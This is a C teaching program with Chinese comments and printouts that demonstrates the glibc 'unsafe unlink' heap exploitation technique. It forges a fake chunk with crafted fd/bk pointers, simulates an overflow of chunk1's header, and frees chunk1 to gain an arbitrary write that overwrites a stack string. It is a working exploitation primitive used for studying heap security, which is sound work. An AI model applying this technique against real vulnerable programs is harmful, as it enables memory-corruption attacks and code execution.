#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

uint64_t *chunk0_ptr;

int main()
{
	setbuf(stdout, NULL);
	printf("unlink在Ubuntu 22.04 x64测试通过.\n");
	printf("当你有一个已知地址的指针时候可以使用unlink（已知的是指针的地址不是指针的值）.\n");
	printf("最常见的场景是一个由全局指针的堆内存可以溢出（甚至是obo）.\n");

	int malloc_size = 0x420; //we want to be big enough not to use tcache or fastbin
	int header_size = 2;

	printf("我们要做的是通过free修改全局的chunk0_ptr实现任意写.\n\n");

	printf("malloc两个足够大的区域，不进入tcache或者fastbin，这里是0x420.\n\n");
	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	printf("全局chunk0_ptr的地址是%p, 指向%p\n", &chunk0_ptr, chunk0_ptr);
	printf("我们要修改的目标指针指向chunk1_ptr %p\n\n", chunk1_ptr);

	printf("我们可以在chunk0里伪造一个chunk.\n");
	printf("我们可以伪造chunk的大小来绕过检查chunksize(p) = prevsize\n");
	//https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f
	chunk0_ptr[1] = chunk0_ptr[-1] - 0x10;

	printf("设置伪造chunk的'next_free_chunk' (fd)指向&chunk0_ptr-0x18使得P->fd->bk = P.\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	printf("设置伪造chunk的previous_free_chunk' (bk)指向&chunk0_ptr-0x10使得P->bk->fd = P.\n");
	printf("这样就可以绕过检查: (P->fd->bk != P || P->bk->fd != P) == False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);

	printf("伪造的chunk fd: %p\n",(void*) chunk0_ptr[2]);
	printf("伪造的chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

	printf("假设我们在chunk0有一个堆溢出，可以让我们随意更改chunk1的元数据.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	printf("我们减小chunk0的大小(通过修改chunk1中的'previous_size') 这样free就会认为chunk0是从我们伪造的chunk开始的.\n");
	printf("伪造的chunk一定要从我们知道地址的指针指向的地方开始.\n");
	chunk1_hdr[0] = malloc_size;
	printf("如果我们“正常地”free了chunk0，chunk1.previous_size会是0x430，但是它现在是: %p\n",(void*)chunk1_hdr[0]);
	printf("通过设置chunk1的'previous_in_use'为False(最低位为0)，我们将chunk0标记为了free.\n\n");
	chunk1_hdr[1] &= ~1;

	printf("现在我们释放chunk1会触发consolidate后向合并，这样会unlink我们伪造的chunk, 复写chunk0_ptr.\n");
	//unlink的代码见https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344
	free(chunk1_ptr);

	printf("此时我们就可以用chunk0_ptr来复写任意地址.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	printf("chunk0_ptr现在指向任意我们选择的地方，用它复写目标字符串.\n");
	printf("原始值: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	printf("新的指: %s\n",victim_string);

	// sanity check
	assert(*(long *)victim_string == 0x4141414142424242L);
}
